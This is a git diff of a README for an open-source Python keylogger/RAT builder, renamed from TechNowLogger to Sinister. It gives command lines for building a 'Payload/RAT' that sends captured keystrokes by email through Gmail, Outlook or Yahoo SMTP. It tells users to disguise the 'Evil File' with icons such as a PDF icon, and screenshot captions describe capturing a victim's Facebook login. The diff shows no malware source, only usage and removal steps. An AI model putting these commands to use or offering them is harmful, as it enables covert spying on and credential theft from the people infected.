@@ -1,25 +1,25 @@
 <p align="center">
-  <img src="https://github.com/PushpenderIndia/technowlogger/blob/master/img/technowlogger-logo.png" alt="TechNowLogger Logo" width=200 height=200/>
+  <img src="https://github.com/PushpenderIndia/technowlogger/blob/master/img/technowlogger-logo.png" alt="Sinister Logo" width=200 height=200/>
 </p>
 
-<h1 align="center">TechNowLogger</h1>
+<h1 align="center">Sinister</h1>
 <p align="center">
     <a href="https://python.org">
     <img src="https://img.shields.io/badge/Python-3.7-green.svg">
   </a>
-  <a href="https://github.com/PushpenderIndia/technowhorse/blob/master/LICENSE">
+  <a href="https://github.com/PushpenderIndia/Sinister/blob/master/LICENSE">
     <img src="https://img.shields.io/badge/License-BSD%203-lightgrey.svg">
   </a>
-  <a href="https://github.com/PushpenderIndia/technowhorse/releases">
-    <img src="https://img.shields.io/badge/Release-2.2-blue.svg">
+  <a href="https://github.com/PushpenderIndia/Sinister/releases">
+    <img src="https://img.shields.io/badge/Release-2.3-blue.svg">
   </a>
-  <a href="https://github.com/PushpenderIndia/technowhorse">
+  <a href="https://github.com/PushpenderIndia/Sinister">
     <img src="https://img.shields.io/badge/Open%20Source-%E2%9D%A4-brightgreen.svg">
   </a>
 </p>
 
 <p align="center">
-  <img src="https://github.com/PushpenderIndia/technowlogger/blob/master/img/hacker-gif.gif" alt="Hacker GIF" width=200 height=200/>
+  <img src="https://github.com/PushpenderIndia/Sinister/blob/master/img/hacker-gif.gif" alt="Hacker GIF" width=200 height=200/>
 </p>
              
                         This small python script can do really awesome work.
@@ -110,10 +110,10 @@ On **30 May 2022**, Google has **removed less secure apps feature**, so instead 
 $ cd /opt/
 
 # Clone this repository
-$ git clone https://github.com/PushpenderIndia/technowlogger.git
+$ git clone https://github.com/PushpenderIndia/Sinister.git
 
-# Navigate to technowlogger folder
-$ cd technowlogger
+# Navigate to Sinister folder
+$ cd Sinister
 
 # Installing dependencies
 $ bash installer_linux.sh
@@ -126,20 +126,20 @@ $ bash installer_linux.sh
 # If you are getting any errors while executing installer_linux.sh, try to install using installer_linux.py
 $ python3 installer_linux.py
 
-$ chmod +x technowgen.py
-$ python3 technowgen.py --help
+$ chmod +x Sinister.py
+$ python3 Sinister.py --help
 
 # Making Payload/RAT
-$ python3 technowgen.py -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path
+$ python3 Sinister.py -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path
 
 # Making Payload using GMAIL SMTP Server, Port Configuration (Default SMTP Server = smtp.gmail.com, Default SMTP Port = 587)
-$ python3 technowgen.py -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path
+$ python3 Sinister.py -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path
 
 # Making Payload using OUTLOOK SMTP Server, Port Configuration
-$ python3 technowgen.py -e youremail@gmail.com -p YourEmailPass -x smtp-mail.outlook.com -y 587 -l -o output_file_name --icon icon_path
+$ python3 Sinister.py -e youremail@gmail.com -p YourEmailPass -x smtp-mail.outlook.com -y 587 -l -o output_file_name --icon icon_path
 
 # Making Payload using YAHOO SMTP Server, Port Configuration
-$ python3 technowgen.py -e youremail@gmail.com -p YourEmailPass -x smtp.mail.yahoo.com -y 587 -l -o output_file_name --icon icon_path
+$ python3 Sinister.py -e youremail@gmail.com -p YourEmailPass -x smtp.mail.yahoo.com -y 587 -l -o output_file_name --icon icon_path
 
 Note: You can also use our custom icons from the icon folder, just use them like this  --icon icon/pdf.ico
 ```
@@ -150,42 +150,40 @@ Note: You can also use our custom icons from the icon folder, just use them like
 $ Install latest python 3.x
 
 # Clone this repository
-$ git clone https://github.com/PushpenderIndia/technowlogger.git
+$ git clone https://github.com/PushpenderIndia/Sinister.git
 
 # Go into the repository
-$ cd technowlogger
+$ cd Sinister
 
 # Installing dependencies
 $ python -m pip install -r requirements.txt
 
-# Open technowgen.py in Text editor and Configure Line 16 WINDOWS_PYTHON_PYINSTALLER_PATH = "C:/Python37-32/Scripts/pyinstaller.exe" 
+# Open Sinister.py in Text editor and Configure Line 16 WINDOWS_PYTHON_PYINSTALLER_PATH = "C:/Python37-32/Scripts/pyinstaller.exe" 
 
 # Getting Help Menu
-$ python technowgen.py --help
+$ python Sinister.py --help
 
 # Making Payload/RAT
-$ python technowgen.py -e youremail@gmail.com -p YourEmailPass -w -o output_file_name --icon icon_path
+$ python Sinister.py -e youremail@gmail.com -p YourEmailPass -w -o output_file_name --icon icon_path
 
 # Making Payload using GMAIL SMTP Server, Port Configuration (Default SMTP Server = smtp.gmail.com, Default SMTP Port = 587)
-$ python technowgen.py -e youremail@gmail.com -p YourEmailPass-w -o output_file_name --icon icon_path
+$ python Sinister.py -e youremail@gmail.com -p YourEmailPass-w -o output_file_name --icon icon_path
 
 # Making Payload using OUTLOOK SMTP Server, Port Configuration
-$ python technowgen.py -e youremail@gmail.com -p YourEmailPass -x smtp-mail.outlook.com -y 587 -w -o output_file_name --icon icon_path
+$ python Sinister.py -e youremail@gmail.com -p YourEmailPass -x smtp-mail.outlook.com -y 587 -w -o output_file_name --icon icon_path
 
 # Making Payload using YAHOO SMTP Server, Port Configuration
-$ python technowgen.py -e youremail@gmail.com -p YourEmailPass -x smtp.mail.yahoo.com -y 587 -w -o output_file_name --icon icon_path
+$ python Sinister.py -e youremail@gmail.com -p YourEmailPass -x smtp.mail.yahoo.com -y 587 -w -o output_file_name --icon icon_path
 
 Note: You can also use our custom icons from the icon folder, just use them like this  --icon icon/pdf.ico
 ```
-
-[![commands for windows ](https://i.vimeocdn.com/video/1527080156-d23b4786d08f4838a64ea38d3ba3d51b910eecceb16de3ca5c8664180b03e4c3-d_1920x1080)](https://vimeo.com/760386042)
 
 ## How to Update
 
 * Run updater.py to Update Autmatically or Download the latest Zip from this GitHub repo
 * Note: Git Must be Installed in order to use updater.py
 
-## Note:- Evil File will be saved inside dist/ folder, inside technowlogger/ folder
+## Note:- Evil File will be saved inside dist/ folder, inside Sinister/ folder
 
 ## Available Arguments 
 * Optional Arguments
@@ -244,7 +242,7 @@ Note: You can also use our custom icons from the icon folder, just use them like
 #### Getting Help
 ![](/img/1.help.png)
 
-#### Running technowgen.py Script
+#### Running Sinister.py Script
 ![](/img/2.running_script.png)
 
 #### Building Finished
@@ -259,7 +257,7 @@ Note: You can also use our custom icons from the icon folder, just use them like
 #### Typing Random text to test Keylogger
 ![](/img/6.randomText-to-test-keylogger.png)
 
-#### Report 1 sended by TechNowLogger
+#### Report 1 sended by Sinister
 ![](/img/7.result.png)
 
 #### Login facebook ~ Victim
@@ -294,7 +292,7 @@ Result will be displayed on the Command prompt after every 10 seconds
 3. It will now give more appropriate error in CMD, just put that issue in Issue Section
 ```
 
-## Removing TechNowLogger in Windows:
+## Removing Sinister in Windows:
 
 #### Method 1:
 
@@ -304,11 +302,9 @@ Result will be displayed on the Command prompt after every 10 seconds
    * Restart the System.
 
 #### Method 2:
-   * Run "RemoveTechnowLogger.bat" in Infected System and then restart the PC to stop the current Running Evil File.
+   * Run "RemoveSinister.bat" in Infected System and then restart the PC to stop the current Running Evil File.
 
-
-
-## Removing TechNowLogger in Linux:
+## Removing Sinister in Linux:
 
    * Open Autostart file with any text editor,
      ****Autostart File Path: ~/.config/autostart/xinput.desktop****
